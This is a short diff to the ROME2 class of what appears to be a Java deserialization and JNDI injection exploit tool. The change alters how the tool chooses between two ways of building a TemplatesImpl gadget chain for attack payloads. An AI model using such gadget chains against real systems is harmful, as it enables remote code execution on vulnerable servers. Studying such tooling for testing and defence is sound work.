@@ -10,6 +10,7 @@ import com.sun.syndication.feed.impl.EqualsBean;
 import javax.xml.transform.Templates;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @Dependencies("rome:rome:1.0")
@@ -17,7 +18,7 @@ public class ROME2 implements ObjectPayload<Object> {
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object o;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             o = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             o = Gadgets.createTemplatesImpl(type, param);
